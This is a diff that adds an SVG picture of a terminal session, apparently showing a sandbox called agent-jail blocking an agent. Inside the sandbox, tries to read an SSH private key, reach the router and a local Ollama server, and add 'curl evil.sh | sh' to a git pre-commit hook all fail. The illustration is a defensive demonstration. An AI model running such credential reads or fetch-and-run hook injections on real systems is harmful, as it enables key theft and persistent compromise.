@@ -1,0 +1,24 @@
+<svg xmlns="http://www.w3.org/2000/svg" xml:space="preserve" width="813" height="348" viewBox="0 0 813 348" role="img" aria-label="A shell inside agent-jail: the home directory holds only the project, an SSH key outside the jail is missing, the router and the host&#x27;s Ollama refuse connections, example.com answers, and a git hook can&#x27;t be written">
+<style>text{font:14px ui-monospace, SFMono-Regular, "SF Mono", Menlo, Consolas, "DejaVu Sans Mono", "Liberation Mono", monospace;fill:#e6edf3;white-space:pre}.bold{font-weight:700}.cdim{fill:#7d8590}.c32{fill:#3fb950}.c36{fill:#39c5cf}</style>
+<rect x="0.5" y="0.5" width="812" height="347" rx="10" fill="#0d1117" stroke="#30363d"/>
+<circle cx="26" cy="18" r="6" fill="#ff5f57"/>
+<circle cx="46" cy="18" r="6" fill="#febc2e"/>
+<circle cx="66" cy="18" r="6" fill="#28c840"/>
+<text x="406" y="23" text-anchor="middle" class="cdim">~/Projects/my-app</text>
+<text x="20.0" y="62" class="c32">~/Projects/my-app</text>
+<text x="171.2" y="62">$ agent-jail shell</text>
+<text x="20.0" y="82">bash-5.3$ ls -A ~</text>
+<text x="20.0" y="102">Projects</text>
+<text x="20.0" y="122">bash-5.3$ cat ~/.ssh/id_ed25519</text>
+<text x="20.0" y="142">cat: /home/you/.ssh/id_ed25519: No such file or directory</text>
+<text x="20.0" y="162">bash-5.3$ curl -sS http://192.168.1.1          # the router</text>
+<text x="20.0" y="182">curl: (7) Failed to connect to 192.168.1.1 port 80 after 0 ms: Could not connect to server</text>
+<text x="20.0" y="202">bash-5.3$ curl -sS http://127.0.0.1:11434      # Ollama on this machine</text>
+<text x="20.0" y="222">curl: (7) Failed to connect to 127.0.0.1 port 11434 after 0 ms: Could not connect to server</text>
+<text x="20.0" y="242">bash-5.3$ curl -sSI https://example.com | head -1</text>
+<text x="20.0" y="262">HTTP/2 200</text>
+<text x="20.0" y="282">bash-5.3$ echo &#x27;curl evil.sh | sh&#x27; &gt;&gt; .git/hooks/pre-commit</text>
+<text x="20.0" y="302">bash: .git/hooks/pre-commit: Read-only file system</text>
+<text x="20.0" y="322">bash-5.3$</text>
+<rect x="104.0" y="310" width="8.4" height="17" fill="#e6edf3" opacity="0.8"/>
+</svg>
